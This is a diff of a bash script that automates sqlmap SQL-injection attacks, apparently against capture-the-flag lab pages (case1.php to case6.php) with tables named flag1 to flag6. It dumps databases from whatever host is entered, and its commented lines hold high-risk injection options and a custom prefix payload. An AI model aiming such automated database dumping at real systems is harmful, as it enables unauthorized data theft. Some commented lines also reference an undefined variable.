@@ -71,33 +71,10 @@
 	#shorthand
 	OUTLOG='/home/'$USER'/.local/share/sqlmapout/'
 	OUTFILE=$(date +%s)'.txt'
-	SQMIN='sqlmap --batch --dump -D testdb --random-agent -u '
-
-	#case 1
-	CS1=''
-	#case 2
-	CS2=''
-	#case 3
-	CS3=''
-	#case 4
-	CS4=''
-	#case 5
-	CS5=''
-	#case 6
-	CS6=''
-	#case 7
-	CS7=''
-	#case 8
-	CS8=''
-	#case 9
-	CS9=''
-	#case 10
-	CS10=''
-	#case 11
-	CS11=''
+	SQMIN='sqlmap --batch --dump -D testdb --dbms=MySQL --random-agent -u '
 
 	# Get target info from user
-	echo -n "Enter Target host: "
+	echo -n "Enter Target host, with port ':', without protocol: "
 	read TGTHOST
 	echo -e "Target host set to" $TGTHOST
 
@@ -106,12 +83,15 @@
 
 	if [ $(dpkg-query -W -f='${Status}' sqlmap 2>/dev/null | grep -c "ok installed") -eq 0 ];
 	then
-	  echo -e "SQLmap not installed, installing now"
-	  apt-get install sqlmap -y;
+	  echo -e "SQLmap not installed, installing now" && apt-get install sqlmap -y;
 	fi
 
 	# check if paths exists
-	if [ -d "$OUTLOG" ]; then (echo 'path: '$OUTLOG' exists'); else (mkdir $OUTLOG && echo -e "making directory: " $OUTLOG); fi
+	if [ -d "$OUTLOG" ];
+	then
+	  (echo 'path: '$OUTLOG' exists');
+	  else (mkdir $OUTLOG && echo -e "making directory: " $OUTLOG);
+	fi
 
 	CS1=$SQMIN'http://'$TGTHOST'/case1.php?id=1*' -T flag1
 	echo -e 'running case 1: ' $CS1
@@ -121,14 +101,20 @@
 #	$CS2='http://'$TGTHOST'/case2.php' --compressed -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://$TGTHOST/case2.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://$TGTHOST' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'id=1*' -T flag2
 #	echo -e 'running case 2: ' $CS2
 #	$CS2 >&1 > $OUTLOG$OUTFILE
-
+#	cat $OUTLOG$OUTFILE | grep -i -E 'flag\d{1,2}\.csv'
+#
+#	CS3=$SQLMIN'http://$TGTHOST/case3.php' -T flag3
 #	echo -e 'running case 3: ' $CS3
-
+#
+#
 #	echo -e 'running case 4: ' $CS4
-
+#	CS4=$SQLMIN'http://$TGTHOST/case4.php' -T flag3
+#
 #	echo -e 'running case 5: ' $CS5
+#	CS5=$SQLMIN'http://$TGTHOST/case5.php?id=*' -T flag5 --no-cast --level 5 --risk 3 --technique=BEU --method=GET
 
 #	echo -e 'running case 6: ' $CS6
+#	$SQLMIN'http://$TGTHOST/case6.php?col=id' -T flag6 --level 5 --risk 3 --method=GET -v 3 --prefix="\`)"
 
 #	echo -e 'running case 7: ' $CS7
 
